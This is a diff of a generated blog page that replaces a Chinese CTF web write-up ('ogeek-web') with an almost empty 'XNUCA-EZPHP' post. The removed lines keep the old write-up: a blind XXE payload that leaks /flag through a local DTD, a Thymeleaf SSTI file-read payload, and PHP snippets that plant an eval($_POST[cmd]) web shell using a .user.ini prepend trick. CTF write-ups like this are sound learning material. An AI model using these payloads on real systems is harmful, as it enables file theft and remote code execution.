@@ -7,28 +7,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>ogeek-web | ddddhm | glotozz&#39;blog</title>
+  <title>XNUCA-EZPHP | ddddhm | glotozz&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="tcl，8说了">
-<meta name="keywords" content="web,wp">
+  <meta name="keywords" content="代码审计,文件上传">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ogeek-web">
-<meta property="og:url" content="http://yoursite.com/2019/08/27/ogeek-web/index.html">
+<meta property="og:title" content="XNUCA-EZPHP">
+<meta property="og:url" content="http://yoursite.com/2019/09/01/XNUCA-EZPHP/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
-<meta property="og:description" content="tcl，8说了">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://qqadapt.qpic.cn/txdocpic/0/2671263aa51a63a1cb3d867cfe9d5651/0">
-<meta property="og:image" content="https://i.loli.net/2019/08/31/ZoyGeHn4DN8PkqU.png">
-<meta property="og:image" content="https://cy-pic.kuaizhan.com/g3/aa/72/3c3a-bf6a-4823-980b-fa7fd112d09a00?sign=1cbdbf182f35ea1d519bd64540720c62&t=1566905749">
-<meta property="og:image" content="https://img03.sogoucdn.com/app/a/100520146/15625c3f91656fbed912edfd356d8cef">
-<meta property="og:image" content="https://img01.sogoucdn.com/app/a/100520146/792e2dc1a5d4b16f8cca88af65184f1d">
-<meta property="og:updated_time" content="2019-08-31T12:25:54.869Z">
+<meta property="og:updated_time" content="2019-09-01T07:16:41.176Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ogeek-web">
-<meta name="twitter:description" content="tcl，8说了">
-<meta name="twitter:image" content="https://qqadapt.qpic.cn/txdocpic/0/2671263aa51a63a1cb3d867cfe9d5651/0">
+<meta name="twitter:title" content="XNUCA-EZPHP">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -153,20 +144,20 @@
           </div>
           <div id="js-content" class="content-ll">
             
-<article id="post-ogeek-web" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-XNUCA-EZPHP" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ogeek-web
+      XNUCA-EZPHP
     </h1>
   
 
         
-        <a href="/2019/08/27/ogeek-web/" class="archive-article-date">
-  	<time datetime="2019-08-27T09:17:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-27</time>
+        <a href="/2019/09/01/XNUCA-EZPHP/" class="archive-article-date">
+  	<time datetime="2019-09-01T07:13:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-01</time>
 </a>
         
       </header>
@@ -179,65 +170,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <meta name="referrer" content="no-referrer">
-
-<blockquote>
-<p>tcl，8说了</p>
-</blockquote>
 <a id="more"></a>
 
-<h3 id="LookAround"><a href="#LookAround" class="headerlink" title="LookAround"></a>LookAround</h3><p>当时知道是xxe注入，但是发现没回显就放弃了。。。</p>
-<p>原来是xxe盲注</p>
-<p>blind xxe思想就是将数据通过外部服务器或者报错信息带出来</p>
-<p>首先尝试http协议，发现访问不了外部服务器，会出现超时的情况</p>
-<p>那么就只能是本地dtd报错数据带出数据</p>
-<p>需要本地dtd的绝对路径，给出了镜像名，</p>
-<p><img src="https://qqadapt.qpic.cn/txdocpic/0/2671263aa51a63a1cb3d867cfe9d5651/0" alt="img"></p>
-<p>发现/usr/share/xml/fontconfig/fonts.dtd是正确的</p>
-<p>构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!ENTITY % expr &apos;aaa)&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">        &lt;!ELEMENT aa (bb&apos;&gt;</span><br><span class="line"></span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;&lt;/message&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><p>是java的ssti，错误回显是Spring boot的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;$&#123;1+1&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>发现不行，Spring boot常用的几把梭（我一个也不知道。。。），wp里说是Thymeleaf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[$&#123;1+1&#125;]]</span><br></pre></td></tr></table></figure>
-
-<p>发现可以，然后构造读文件，按行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;content&quot;:&quot;[[$&#123;new java.io.BufferedReader(new java.io.FileReader(\&quot;/flag\&quot;)).readLine()&#125;]]&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<h2 id="Easy-Realworld-Chanllenge"><a href="#Easy-Realworld-Chanllenge" class="headerlink" title="Easy Realworld Chanllenge"></a>Easy Realworld Chanllenge</h2><p>先用telnet://172.18.0.3:21连接，账号密码是弱口令ctf、ctf</p>
-<p>PASV、然后计算一下端口</p>
-<p><img src="https://i.loli.net/2019/08/31/ZoyGeHn4DN8PkqU.png" alt="Snipaste_2019-08-31_07-43-34.png"></p>
-<p>然后用计算出的端口连接</p>
-<p><img src="https://cy-pic.kuaizhan.com/g3/aa/72/3c3a-bf6a-4823-980b-fa7fd112d09a00?sign=1cbdbf182f35ea1d519bd64540720c62&t=1566905749" alt="1566905756201"></p>
-<blockquote>
-<p>我不小心按了最下面的类似播放的图标，导致一部分操作看不见了。。。</p>
-</blockquote>
-<h2 id="Enjoy-You-Self"><a href="#Enjoy-You-Self" class="headerlink" title="Enjoy You Self"></a>Enjoy You Self</h2><blockquote>
-<p>这题比较有意思，盲注的赶脚</p>
-</blockquote>
-<p><img src="https://img03.sogoucdn.com/app/a/100520146/15625c3f91656fbed912edfd356d8cef" alt="1567158990419"></p>
-<p>这里先检查了 filename 是不是八位（包括下划线在内的任何字字符 【A-Za-z0-9_】）。是的话就创建一个这个名字的文件。删除列出的第一个文件。而文件根据文件名的字符集排序，所以只要我们的文件没被删掉，说明原来存在的文件名比我们的小</p>
-<p>脚本就先不贴了，也没环境。。。</p>
-<p>然后居然还有娃题</p>
-<p><img src="https://img01.sogoucdn.com/app/a/100520146/792e2dc1a5d4b16f8cca88af65184f1d" alt="1567159984048"></p>
-<blockquote>
-<p>这个文件是个下载器，可以把远程服务器的东西下载到这个服务器上。在自己服务器上创建一个文件，然后把所有访问都重写到这个文件。</p>
-<p>这里都是参考zhaojin师傅的，思路很清楚👍</p>
-</blockquote>
-<p>举个栗子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header(&apos;Content-Type:glotozz/php/.&apos;);</span><br><span class="line">	echo &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>再写个glotozz/glotozz.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header(&apos;Content-Type:glotozz/txt&apos;);</span><br><span class="line">	echo &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>再写个.user.ini</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	header(&apos;Content-Type:.././.user.ini&apos;);</span><br><span class="line">	echo &apos;auto_prepend_file = /var/www/html/users/xxxxx/uploads/glotozz/glotozz.txt&apos;;</span><br></pre></td></tr></table></figure>
-
-<p>最后，需要用脚本上传，因为清理的比较快</p>
-<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.zhaoj.in/read-6251.html?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://www.zhaoj.in/read-6251.html?tdsourcetag=s_pctim_aiomsg</a></p>
-<p><a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p>
 
       
 
@@ -277,11 +211,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件上传</a>
         		</li>
       		
 		</ul>
@@ -337,7 +271,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/08/27/ogeek-web/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/01/XNUCA-EZPHP/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -351,18 +285,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/08/29/D1eCTF-web/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          D1eCTF-web
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/08/24/php留言板设计/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">php留言板设计</div>
+    <a href="/2019/08/31/redtiger-wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">redtiger-wp</div>
       <i class="icon-circle-right"></i>
     </a>
   
